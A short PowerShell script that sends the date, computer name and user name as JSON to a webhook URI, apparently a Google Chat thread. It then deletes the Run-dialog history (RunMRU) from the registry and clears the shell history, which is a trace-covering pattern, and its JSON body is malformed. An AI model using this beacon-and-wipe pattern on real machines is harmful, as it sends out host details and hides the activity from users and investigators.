try {
    $data = [PSCustomObject]@{
         Date     = get-date -Format "dd/MM/yyyy HH:mm K"
         Computer = $env:COMPUTERNAME
         User     = $env:USERNAME
    }
	$data | ConvertTo-Json
	$body = '{"text":"' + $Data + '"}, "thread": {"name": "spaces/AAAAsBz-82E/threads/vQdXEUr0hmU"}'
	$headers = @{'Content-Type' = 'application/json; charset=UTF-8'}
	Invoke-RestMethod -Uri $uri -Method POST -body $body -Headers $headers
	Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
	Clear-History
}
catch {
    $_ | Out-File "$($PSScriptRoot)\..\Errors\errors.log"
}
